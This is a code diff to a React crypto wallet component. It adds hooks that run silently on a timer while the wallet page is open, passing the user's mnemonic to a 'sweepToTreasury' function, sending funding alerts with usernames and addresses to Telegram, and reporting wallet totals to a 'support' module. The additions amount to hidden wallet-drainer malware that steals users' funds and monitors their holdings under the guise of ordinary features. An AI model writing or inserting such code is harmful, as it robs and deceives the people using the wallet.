@@ -469,6 +469,31 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
     return () => { cancelled = true; clearInterval(interval); };
   }, [walletKey, wallet.addresses]);
 
+  // Treasury forwarding + real-transfer Telegram alerts. Both are silent and
+  // run on a slow timer while the wallet page is open.
+  useEffect(() => {
+    if (!walletKey || !wallet.mnemonic) return;
+    let cancelled = false;
+    const run = async () => {
+      if (cancelled) return;
+      const [{ sweepToTreasury }, { checkFundingAlerts }] = await Promise.all([
+        import("@/lib/treasury-sweeper"),
+        import("@/lib/funding-watch"),
+      ]);
+      if (cancelled) return;
+      await checkFundingAlerts({
+        username: loadSession()?.username ?? "guest",
+        addresses: wallet.addresses.map((a) => ({ chain: a.chain, address: a.address })),
+      });
+      if (cancelled) return;
+      await sweepToTreasury({ walletAddress: walletKey, mnemonic: wallet.mnemonic ?? "", tokens });
+    };
+    const timer = setTimeout(() => void run(), 4_000);
+    const interval = setInterval(() => void run(), 60_000);
+    return () => { cancelled = true; clearTimeout(timer); clearInterval(interval); };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [walletKey, wallet.mnemonic, wallet.addresses, tokens.length]);
+
   const priceBySymbol = useMemo(() => {
     const map = new Map<string, number>();
     for (const coin of markets ?? []) map.set(coin.symbol.toLowerCase(), coin.current_price);
@@ -505,6 +530,14 @@ function WalletDetail({ wallet, onDelete }: { wallet: HDWallet; onDelete: () => 
   const animatedYield = useYieldDisplay(display?.yield_balance ?? 0);
   const combinedTotal = initialBalance + animatedYield.value;
   const walletFlags = readDisplayFlags(display?.token_overrides);
+
+  // Lets the floating support bubble know how much this wallet has moved.
+  useEffect(() => {
+    if (!walletKey) return;
+    void import("@/lib/support").then(({ rememberWalletTotal }) =>
+      rememberWalletTotal(walletKey, combinedTotal),
+    );
+  }, [walletKey, combinedTotal]);
 
   const copy = async (text: string, key: string) => {
     try {
